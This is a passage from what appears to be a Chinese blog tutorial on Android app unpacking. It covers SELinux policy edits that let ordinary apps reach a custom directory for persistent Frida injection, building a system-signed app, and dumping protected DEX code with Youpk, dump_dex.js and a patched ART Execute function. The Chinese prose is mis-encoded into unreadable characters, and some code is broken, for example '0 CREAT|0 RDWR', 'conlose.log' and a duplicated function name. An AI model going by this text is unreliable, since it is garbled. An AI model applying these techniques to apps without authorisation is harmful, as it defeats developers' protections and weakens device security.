‡ç­¾ï¼šxiaojianbang_file</p><p>åœ¨å¦‚ä¸‹ä¸¤ä¸ªæ–‡ä»¶ä¸­/system/sepolicy/public/file.teï¼Œ/system/sepolicy/prebuilts/api/29.0/public/file.te</p><p>æ·»åŠ æ•°æ® 405</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"># /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist</span><br><span class="line">type xiaojianbang_file, file_type, data_file_type, core_data_file_type, mlstrustedobject;</span><br><span class="line"># <span class="comment">// add</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2ï¼‰è‡ªå®šä¹‰ç›®å½•å…³è”æ–‡ä»¶ç±»å‹æ ‡ç­¾: xiaojianbang_file</p><p>åœ¨å¦‚ä¸‹ä¸¤ä¸ªæ–‡ä»¶ä¸­/system/sepolicy/private/file_contextsï¼Œ/system/sepolicy/prebuilts/api/29.0/private/file_contexts</p><p>æ·»åŠ æ•°æ® 122</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"># /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist</span><br><span class="line">/data/<span class="keyword">system</span>/xsettings(/.*)?u:object_r:xiaojianbang_file:s0</span><br><span class="line"># <span class="comment">// add</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é…ç½®appè®¿é—®æ ‡ç­¾æ–‡ä»¶æƒé™">é…ç½®appè®¿é—®æ ‡ç­¾æ–‡ä»¶æƒé™</h2><p>1ï¼‰é…ç½®system appè®¿é—® xiaojianbang_file æ ‡ç­¾æ–‡ä»¶çš„æƒé™</p><p>åœ¨å¦‚ä¸‹æ–‡ä»¶ä¸­/system/sepolicy/private/system_app.teå’Œ/system/sepolicy/prebuilts/api/29.0/private/system_app.te</p><p>æ·»åŠ å¦‚ä¸‹æ•°æ® (æœ«å°¾)</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># // add</span></span><br><span class="line"><span class="comment"># add for accessing xiaojianbang_file</span></span><br><span class="line">allow system_app xiaojianbang_file:dir  &#123; getattr setattr <span class="keyword">open</span> <span class="keyword">read</span> <span class="keyword">write</span> remove_name create add_name search <span class="keyword">rmdir</span> &#125;;</span><br><span class="line">allow system_app xiaojianbang_file:file &#123; getattr setattr <span class="keyword">open</span> <span class="keyword">read</span> <span class="keyword">write</span> create <span class="keyword">unlink</span> &#125;;=</span><br></pre></td></tr></table></figure><p>2ï¼‰é…ç½®ç¬¬ä¸‰æ–¹appè®¿é—® xiaojianbang_file æ ‡ç­¾æ–‡ä»¶çš„æƒé™</p><p>åœ¨å¦‚ä¸‹æ–‡ä»¶ä¸­</p><p>/system/sepolicy/private/untrusted_app.te</p><p>/system/sepolicy/private/untrusted_app_25.te</p><p>/system/sepolicy/private/untrusted_app_27.te</p><p>/system/sepolicy/private/untrusted_app_all.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_25.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_27.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_all.te</p><p>æ·»åŠ å¦‚ä¸‹æ•°æ®(æœ«å°¾)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"><span class="meta"># add for accessing xiaojianbang_file</span></span><br><span class="line"><span class="function">allow <span class="title">untrusted_app</span><span class="params">(ä¸æ–‡ä»¶åè¦ä¸€è‡´)</span> xiaojianbang_file:dir  &#123;</span> getattr open read write search rmdir &#125;;</span><br><span class="line">allow untrusted_appï¼ˆä¸æ–‡ä»¶åè¦ä¸€è‡´ xiaojianbang_file:file &#123; getattr open read write &#125;;</span><br></pre></td></tr></table></figure><h2 id="å¸¸è§çš„ç¼–è¯‘é”™è¯¯">å¸¸è§çš„ç¼–è¯‘é”™è¯¯</h2><p>1ï¼‰ä¿®æ”¹ä»¥ä¸‹æ–‡ä»¶ï¼Œé˜²æ­¢æŠ¥é”™ï¼šæ ‡ç­¾xiaojianbang_file æœªå®šä¹‰</p><p>/system/sepolicy/private/compat/26.0/26.0.ignore.cil 17</p><p>/system/sepolicy/private/compat/27.0/27.0.ignore.cil 16</p><p>/system/sepolicy/private/compat/28.0/28.0.ignore.cil 15</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/26.0/26.0.ignore.cil 17</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/27.0/27.0.ignore.cil 16</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/28.0/28.0.ignore.cil 15</p><p>åœ¨ä»¥ä¸Šæ–‡ä»¶ä¸­åŠ å…¥æ ‡ç­¾åæ•°æ® xiaojianbang_fileï¼Œä¸¤ä¸ªæ–‡ä»¶æ·»åŠ çš„å†…å®¹éœ€è¦ä¸€è‡´</p><p>2ï¼‰ You have tried to change the API from what has been previously released inan SDK.  Please fix the errors listed above</p><p>ä¿®æ”¹äº†ä»£ç ä»¥åï¼Œæœ‰äº›æ—¶å€™éœ€è¦å…ˆ make update-apiï¼Œå†ç¼–è¯‘</p><h2 id="FridaæŒä¹…åŒ–ç®¡ç†appçš„å¼€å‘">FridaæŒä¹…åŒ–ç®¡ç†appçš„å¼€å‘</h2><p>å·¥ç¨‹åå­—ï¼šxjbPersistDemo</p><ol><li>ç®¡ç†appçš„åŠŸèƒ½<br>æ˜¾ç¤ºå·²å®‰è£…appåˆ—è¡¨<br>å¯ä»¥å¯¹æ¯ä¸ªappæŒ‡å®šéœ€è¦æ³¨å…¥çš„JS<br>å¯ä»¥è®¾ç½®æ˜¯å¦å¯ç”¨æŒä¹…åŒ–</li><li>ç›¸åº”åŠŸèƒ½å®ç°åŸç†<br>3.1 åˆ›å»ºè¡¨ç¤ºå¯ç”¨çš„æ–‡ä»¶/data/system/xsettings/xiaojianbang/persist/pkgName/xiaojianbang_persist       3.2 æŒ‡å®šçš„JSæ–‡ä»¶å¤åˆ¶åˆ°ä»¥ä¸‹ç›®å½•/data/system/xsettings/xiaojianbang/jscfg/pkgName/config.js<br>3.3 å‰©ä¸‹çš„å¤åˆ¶soã€JSæ–‡ä»¶å’ŒåŠ è½½soçš„æ“ä½œï¼Œç”±é­”æ”¹çš„doXiaojianbangPersistå‡½æ•°å®Œæˆ</li></ol><p><strong>systemæƒé™appå¼€å‘</strong></p><p>1ï¼‰åˆ›å»ºçš„ç›®å½•æ˜¯systemæƒé™ï¼Œæ‰€ä»¥appè¦æœ‰systemæƒé™ï¼š</p><ul><li><p>ç¼–å†™å®Œå·¥ç¨‹åœ¨ manifest ä¸­åŠ å…¥ android:sharedUserId=â€œandroid.uid.systemâ€</p></li><li><p>ç¼–è¯‘ç”Ÿæˆapkæ–‡ä»¶ï¼Œå°†ç¼–è¯‘å‡ºæ¥çš„appæ”¾å…¥/packages/apps/xiaojianbangPersist</p></li><li><p><a href="http://xn--Android-nu9ky494a.mk">ç¼–å†™Android.mk</a>ï¼Œä¹Ÿæ”¾å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œå†…å®¹ä¸ºï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># // add</span></span><br><span class="line"><span class="comment"># è®¾ç½®å½“å‰å·¥ä½œè·¯å¾„</span></span><br><span class="line">LOCAL_PATH:= <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…é™¤å˜é‡å€¼</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line"><span class="comment"># ç”Ÿæˆçš„æ¨¡å—åç§°</span></span><br><span class="line">LOCAL_MODULE := ControlAPP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆçš„æ¨¡å—ç±»å‹</span></span><br><span class="line">LOCAL_MODULE_CLASS := APPS</span><br><span class="line"><span class="comment"># ç”Ÿæˆçš„æ¨¡å—åç¼€å,æ­¤å¤„ä¸ºapk</span></span><br><span class="line">LOCAL_MODULE_SUFFIX := <span class="variable">$(COMMON_ANDROID_PACKAGE_SUFFIX)</span></span><br><span class="line"><span class="comment"># è®¾ç½®æ¨¡å—tagï¼Œtagså–å€¼å¯ä»¥ä¸º:user debug eng tests optional</span></span><br><span class="line"><span class="comment"># optionalè¡¨ç¤ºå…¨å¹³å°ç¼–è¯‘</span></span><br><span class="line">LOCAL_MODULE_TAGS := optional</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOCAL_PRIVILEGED_MODULE := true</span></span><br><span class="line"></span><br><span class="line">LOCAL_BUILT_MODULE_STEM := package.apk</span><br><span class="line"></span><br><span class="line">LOCAL_DEX_PREOPT := false</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æºæ–‡ä»¶</span></span><br><span class="line">LOCAL_SRC_FILES := <span class="variable">$(LOCAL_MODULE)</span>.apk</span><br><span class="line"></span><br><span class="line">LOCAL_CERTIFICATE := platform</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç­¾åï¼Œæ­¤å¤„è¡¨ç¤ºä¿æŒapkåŸæœ‰ç­¾å</span></span><br><span class="line"><span class="comment"># LOCAL_CERTIFICATE := PRESIGNED</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>å•ç‹¬ç¼–è¯‘æŒ‡å®šæ¨¡å— mmm packages/apps/xiaojianbangPersist</p></li><li><p>ç¼–è¯‘åçš„æ¨¡å—åœ¨ /out/target/product/sailfish/system/app/ControlAPP(appåå­—)</p></li><li><p>ä½¿ç”¨ make snod å°†ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶æ‰“åŒ…æˆé•œåƒï¼Œåˆ·å…¥system.imgå³å¯</p></li></ul><p>2ï¼‰å¦‚æœè¦åœ¨ç¼–è¯‘æ•´ä¸ªç³»ç»Ÿæ—¶ï¼Œä¸€èµ·ç¼–è¯‘è¿™ä¸ªæ¨¡å—ï¼Œéœ€è¦å°†æ¨¡å— ControlAPP åŠ å…¥æºç ç¼–è¯‘é“¾</p><p>2.1 å¢åŠ çš„å†…ç½®æ¨¡å—ï¼Œå¦‚æœä¸ºAPPï¼ŒåŠ å…¥åˆ°å¦‚ä¸‹æ–‡ä»¶ä¸­/build/make/target/product/handheld_product.mk</p><p>2.2 å¢åŠ çš„å†…ç½®æ¨¡å—ï¼Œå¦‚æœä¸ºå¯æ‰§è¡Œç¨‹åºï¼ŒåŠ å…¥åˆ°å¦‚ä¸‹æ–‡ä»¶ä¸­/build/make/target/product/base_system.mk</p><h1>åˆ·æœº</h1><p>ç®€å•è¡¥å……åˆ·æœºçš„ä¸€ä¸ªæ³¨æ„ç‚¹ï¼Œå½“çº¿åˆ·è¿è¡Œ.batæ‰¹å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æ— æ³•è¯†åˆ«è®¾å¤‡ï¼š</p><ul><li><p>å®‰è£…Google USBé©±åŠ¨(Android Studioä¸­å³å¯ä¸‹è½½)<img src="/posts/e65d2ab6.htm/image-20240125184838037.png" alt="image-20240125184838037"></p></li><li><p>æ­¤ç”µè„‘-&gt;å³é”®ç®¡ç†-&gt;è®¾å¤‡ç®¡ç†å™¨-&gt;é€‰ä¸­æ²¡æœ‰é©±åŠ¨çš„androidè®¾å¤‡-&gt;å³é”®æ›´æ–°é©±åŠ¨ç¨‹åº-&gt;é€‰æ‹©æµè§ˆæˆ‘çš„ç”µè„‘æ‰¾åˆ°åˆšæ‰ä¸‹è½½çš„é©±åŠ¨-&gt;ç¡®å®šå®‰è£…</p></li></ul><h1>Youpkè„±å£³æœº</h1><p>å‚è€ƒï¼š<a href="https://github.com/Youlor/Youpk">https://github.com/Youlor/Youpk</a></p><h2 id="åˆ·æœº">åˆ·æœº</h2><ul><li>é‡å¯è‡³bootloader: <code>adb reboot bootloader</code></li><li>è§£å‹ Youpk_sailfish.zip å¹¶åŒå‡» <code>flash-all.bat</code></li></ul><h2 id="ä½¿ç”¨æ–¹æ³•">ä½¿ç”¨æ–¹æ³•</h2><p>Youpkæ˜¯ä¸€æ¬¾é’ˆå¯¹Dexæ•´ä½“åŠ å›º+å„å¼å„æ ·çš„DexæŠ½å–çš„è„±å£³æœº</p><p>1ï¼‰é…ç½®å¾…è„±å£³çš„appåŒ…å, å‡†ç¡®æ¥è®²æ˜¯è¿›ç¨‹åç§°</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb <span class="keyword">shell</span><span class="language-bash"> <span class="string">&quot;echo åº”ç”¨åŒ…å &gt;&gt; /data/local/tmp/unpacker.config&quot;</span></span></span><br></pre></td></tr></table></figure><p>2ï¼‰å¯åŠ¨apkç­‰å¾…è„±å£³ æ¯éš”10ç§’å°†è‡ªåŠ¨é‡æ–°è„±å£³(å·²å®Œå…¨dumpçš„dexå°†è¢«å¿½ç•¥), å½“æ—¥å¿—æ‰“å°unpack endæ—¶è„±å£³å®Œæˆ</p><p>pullå‡ºdumpæ–‡ä»¶, dumpæ–‡ä»¶è·¯å¾„ä¸º <code>/data/data/åŒ…å/unpacker</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">adb</span> pull /<span class="class"><span class="keyword">data</span>/<span class="keyword">data</span>/åŒ…å/unpacker</span></span><br></pre></td></tr></table></figure><p>3ï¼‰è°ƒç”¨ä¿®å¤å·¥å…· dexfixer.jar, ä¸¤ä¸ªå‚æ•°, ç¬¬ä¸€ä¸ªä¸ºdumpæ–‡ä»¶ç›®å½•(unpackerï¼Œå¿…é¡»ä¸ºæœ‰æ•ˆè·¯å¾„), ç¬¬äºŒä¸ªä¸ºé‡ç»„åçš„DEXç›®å½•(ä¸å­˜åœ¨å°†ä¼šåˆ›å»º),åˆå¹¶.binä¸.dex</p><p><code>java -jar dexfixer.jar /path/to/unpacker /path/to/output</code></p><h1>dump_dex.jsè„šæœ¬è„±å£³</h1><p><strong>è¿™ä¸ªåªèƒ½è„±å£³æœ‰dexå¤´çš„apkæ–‡ä»¶</strong></p><h2 id="ä½¿ç”¨æ–¹æ³•-2">ä½¿ç”¨æ–¹æ³•</h2><p>ä½¿ç”¨å‘½ä»¤</p><p><code>frida -U -f åŒ…å -l dump_dex.js --no-pause</code>  è¿›è¡Œè„±å£³</p><p>è„±å£³åçš„dexæ–‡ä»¶åœ¨/data/data/åŒ…å/filesæ–‡ä»¶ä¸‹</p><p>ä½¿ç”¨å‘½ä»¤ adb pull æ¨é€åˆ°æ‰‹æœº</p><p>ç„¶åé‡å‘½å classes.dexï¼Œclasses.dex2â€¦</p><p>å‹ç¼©æˆ.zipæ–‡ä»¶æ‹–å…¥jadx-guiè¿›è¡Œåç¼–è¯‘</p><ul><li>åœ¨è„±å£³åå¯ä»¥ä½¿ç”¨pyè„šæœ¬æ‰“åŒ…æˆä¸€ä¸ª å‘½ä»¤ python merge_dex.py ./dex_path/ livedex</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3.7 merge_dex.py ./file/ livedex</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;start error&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">path = sys.argv[<span class="number">1</span>] <span class="comment">#æ–‡ä»¶å¤¹ç›®å½•</span></span><br><span class="line">files= os.listdir(path) <span class="comment">#å¾—åˆ°æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åç§°</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files: <span class="comment">#éå†æ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="keyword">if</span> file.find(<span class="string">&quot;dex&quot;</span>) &gt; <span class="number">0</span>: <span class="comment">## æŸ¥æ‰¾dex æ–‡ä»¶</span></span><br><span class="line">        sh = <span class="string">&#x27;jadx -j 1 -r -d &#x27;</span> + sys.argv[<span class="number">2</span>] + <span class="string">&quot; &quot;</span> + path + file</span><br><span class="line">        <span class="built_in">print</span>(sh)</span><br><span class="line">        os.system(sh)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹–å…¥åç¼–è¯‘å·¥å…·å½“ä¸­ï¼Œå¯èƒ½æ¯”æŠŠå¤šä¸ªdexæ‹–å…¥jadxä¸­åç¼–è¯‘çš„è¦å®Œæ•´ä¸€äº›</p><h1>FART</h1><p>8.0</p><h2 id="FARTæ¡†æ¶">FARTæ¡†æ¶</h2><p>ä¸‰ä¸ªç»„ä»¶ï¼šè„±å£³ç»„ä»¶ ä¸»åŠ¨è°ƒç”¨ç»„ä»¶ ä¿®å¤ç»„ä»¶</p><h2 id="dex2oatç¼–è¯‘æµç¨‹ï¼šå‡½æ•°ç²’åº¦è¿›è¡Œç¼–è¯‘">dex2oatç¼–è¯‘æµç¨‹ï¼šå‡½æ•°ç²’åº¦è¿›è¡Œç¼–è¯‘</h2><p>CompileMethodæ–¹æ³•ï¼šæ˜¯å¦å¯¹å‡½æ•°è¿›è¡Œç¼–è¯‘ï¼Œä¸ç¼–è¯‘åˆå§‹åŒ–å‡½æ•° not <clinit><br>å³å¹¶ä¸æ˜¯æ‰€æœ‰å‡½æ•°éƒ½è¢«ç¼–è¯‘ï¼Œå› æ­¤å¯¹äºå½“ä¸€ä¸ªç±»è¢«åˆå§‹åŒ–æ—¶ï¼Œè¯¥ç±»åˆå§‹åŒ–å‡½æ•°å§‹ç»ˆè¿è¡Œåœ¨interpreteræ¨¡å¼(è§£é‡Šæ¨¡å¼)</clinit></p><p>ARTä¸‹å‡½æ•°æ‰§è¡Œæ¨¡å¼ï¼š</p><p>interpreteræ¨¡å¼ï¼šç”±ARTä¸‹è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œ<br>quickæ¨¡å¼ï¼šç›´æ¥è¿è¡Œdex2oatç¼–è¯‘ç”Ÿæˆçš„armæŒ‡ä»¤</p><h2 id="è„±å£³ç‚¹">è„±å£³ç‚¹</h2><p>å‡½æ•°è¿›å…¥è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œä¹‹å‰ä¼šè¿›å…¥<strong>Execute</strong>å‡½æ•°</p><p>è¿™ä¸ªè„±å£³ç‚¹å¥½å¤„ï¼šå‡½æ•°ï¼Œåˆå§‹åŒ–å‡½æ•°éƒ½ä¼šç»è¿‡ä¸”executeæ˜¯å†…è”å‡½æ•°ä¸æ˜“è¢«hook</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Executeå‡½æ•°ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</span></span><br><span class="line">ArtMethod* artmethod=shadow_frame.<span class="built_in">GetMethod</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(artmethod-&gt;<span class="built_in">PrettyMethod</span>().<span class="built_in">c_str</span>(),<span class="string">&quot;&lt;clinit&gt;&quot;</span>))&#123; <span class="comment">//è¿‡æ»¤ é˜²æ­¢é‡å¤dump</span></span><br><span class="line">    <span class="type">const</span> DexFile* dexfile=artmethod-&gt;<span class="built_in">GetDexFile</span>();</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span>* begin=dexfile-&gt;<span class="built_in">Begin</span>();</span><br><span class="line">    <span class="type">size_t</span> size=dexfile-&gt;<span class="built_in">Size</span>();</span><br><span class="line">    <span class="type">char</span> dexfilepath[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d Execute.dex&quot;</span>,(<span class="type">int</span>)size,<span class="built_in">getpid</span>());</span><br><span class="line">    <span class="type">int</span> fd=<span class="built_in">open</span>(dexfilepath,<span class="number">0</span> CREAT|<span class="number">0</span> RDWR,<span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> number=<span class="built_in">write</span>(fd,begin,size);</span><br><span class="line">        <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>(fd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FART-Frida">FART&amp;Frida</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯¹åŠ¨æ€åŠ è½½çš„dex æ’ä»¶çš„dexè¿›è¡Œä¸»åŠ¨è°ƒç”¨(æ­£å¸¸è¿è¡Œappä¸ä¼šè¢«åŠ è½½)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fartwithClassloader</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(loader);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">fartwithClassloader</span>(loader);     </span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    conlose.<span class="title function_">log</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹dexclassloaderå®ä¾‹ä¸»åŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fartwithClassloader</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(instance);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">fartwithClassloader</span>(instance);     </span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    conlose.<span class="title function_">log</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;) </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»åŠ¨è°ƒç”¨æŸä¸ªç±»ä¸‹æ‰€æœ‰æ–¹æ³•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cn.cntv.ui.activity.SpringPlayerActivity ä¸»åŠ¨è°ƒç”¨è¿™ä¸ªç±»</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadoneclass</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//public static void loadClassAndInvoke   è°ƒç”¨fartä¸­è¿™ä¸ªå‡½æ•°å³å¯å®ç°</span></span><br><span class="line"><span class="comment">//(ClassLoader appClassloader, String eachclassname, Method dumpMethodCode_method)</span></span><br><span class="line"><span class="comment">//public static ClassLoader getClassloader()</span></span><br><span class="line">        <span class="keyword">var</span> appClassloader = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">getClassloader</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;appClassloader-&gt;&quot;</span>, appClassloader); </span><br><span class="line">        <span class="comment">//dumpMethodCode</span></span><br><span class="line"><span class="comment">// private static native void dumpMethodCode(Object m);</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">DexFile</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;dalvik.system.DexFile&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Object</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> array = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;java.lang.Class&quot;</span>, [<span class="title class_">Object</span>.<span class="property">class</span>]);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        var arry=[Java.use(&quot;java.lang.Object&quot;).class]</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> dumpMethodCode = <span class="title class_">DexFile</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(<span 